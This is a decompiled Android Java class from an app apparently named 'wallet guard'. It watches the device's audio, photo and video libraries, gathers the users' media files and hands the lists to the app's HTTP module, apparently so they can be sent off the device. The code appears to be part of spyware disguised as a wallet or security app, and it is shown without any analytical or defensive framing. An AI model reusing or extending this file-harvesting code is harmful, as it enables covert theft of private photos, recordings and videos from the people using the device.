package com.guard.wallet.thread;

import a1.AbstractC0026q;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.utils.AbstractC0251g;
import java.io.File;
import java.util.LinkedList;
import java.util.concurrent.Callable;

/* renamed from: com.guard.wallet.thread.a */
/* loaded from: classes.dex */
public final class CallableC0232a implements Callable {

    /* renamed from: a */
    public final /* synthetic */ int f336a;

    /* renamed from: b */
    public final Uri f337b;

    public /* synthetic */ CallableC0232a(Uri uri, int i2) {
        this.f336a = i2;
        this.f337b = uri;
    }

    /* renamed from: a */
    public final Boolean m569a() {
        Cursor cursor = null;
        switch (this.f336a) {
            case 0:
                if (AbstractC0251g.m653Z() != null && AbstractC0251g.m666m()) {
                    LinkedList linkedList = new LinkedList();
                    String[] strArr = {"_id", "_data", "_display_name"};
                    ContentResolver contentResolver = AbstractC0251g.m653Z().getContentResolver();
                    if (contentResolver != null) {
                        try {
                            cursor = contentResolver.query(this.f337b, strArr, null, null, "date_modified desc");
                            if (cursor != null) {
                                while (cursor.moveToNext()) {
                                    File file = new File(cursor.getString(cursor.getColumnIndex("_data")));
                                    if (file.exists() && file.isFile()) {
                                        linkedList.add(file);
                                    }
                                }
                            }
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AudioAlbumChangeThread", e2);
                        }
                        if (cursor != null) {
                            cursor.close();
                        }
                    }
                    if (!linkedList.isEmpty()) {
                        AbstractC0207l.m413A(linkedList);
                    }
                }
                break;
            case 1:
                if (AbstractC0251g.m653Z() != null && AbstractC0251g.m668o()) {
                    LinkedList linkedList2 = new LinkedList();
                    String[] strArr2 = {"_id", "_data", "_display_name"};
                    ContentResolver contentResolver2 = AbstractC0251g.m653Z().getContentResolver();
                    if (contentResolver2 != null) {
                        try {
                            cursor = contentResolver2.query(this.f337b, strArr2, null, null, "date_modified desc");
                            if (cursor != null && cursor.moveToNext()) {
                                File file2 = new File(cursor.getString(cursor.getColumnIndex("_data")));
                                if (file2.exists() && file2.isFile()) {
                                    linkedList2.add(file2);
                                }
                            }
                        } catch (Exception e3) {
                            AbstractC0026q.m186s("PhotoAlbumChangeThread", e3);
                        }
                        if (cursor != null) {
                            cursor.close();
                        }
                    }
                    if (!linkedList2.isEmpty()) {
                        AbstractC0207l.m416D(linkedList2);
                    }
                }
                break;
            default:
                if (AbstractC0251g.m653Z() != null && AbstractC0251g.m670q()) {
                    LinkedList linkedList3 = new LinkedList();
                    String[] strArr3 = {"_id", "_data", "_display_name"};
                    ContentResolver contentResolver3 = AbstractC0251g.m653Z().getContentResolver();
                    if (contentResolver3 != null) {
                        try {
                            cursor = contentResolver3.query(this.f337b, strArr3, null, null, "date_modified desc");
                            if (cursor != null) {
                                while (cursor.moveToNext()) {
                                    File file3 = new File(cursor.getString(cursor.getColumnIndex("_data")));
                                    if (file3.exists() && file3.isFile() && file3.canRead()) {
                                        linkedList3.add(file3);
                                    }
                                }
                            }
                        } catch (Exception e4) {
                            AbstractC0026q.m186s("VideoAlbumChangeThread", e4);
                        }
                        if (cursor != null) {
                            cursor.close();
                        }
                    }
                    if (!linkedList3.isEmpty()) {
                        AbstractC0207l.m417E(linkedList3);
                    }
                }
                break;
        }
        return Boolean.TRUE;
    }

    @Override // java.util.concurrent.Callable
    public final /* bridge */ /* synthetic */ Object call() {
        switch (this.f336a) {
        }
        return m569a();
    }
}
